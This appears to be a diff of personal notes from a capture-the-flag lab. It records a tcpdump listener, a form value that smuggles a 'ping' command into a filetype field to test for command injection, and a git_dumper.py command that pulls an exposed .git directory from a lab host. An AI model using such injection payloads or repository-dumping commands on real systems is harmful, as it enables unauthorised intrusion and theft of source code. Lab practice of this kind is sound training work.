@@ -153,6 +153,10 @@ ____________________________________-
 
 sudo tcpdump -ni tun0 icmp
 photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg;ping+10.10.14.5&dimensions=30x20
+_____________________________________________________
+GIT DUMPER
+python3 git_dumper.py http://siteisup.htb/dev/.git/ web
+
 
 
 
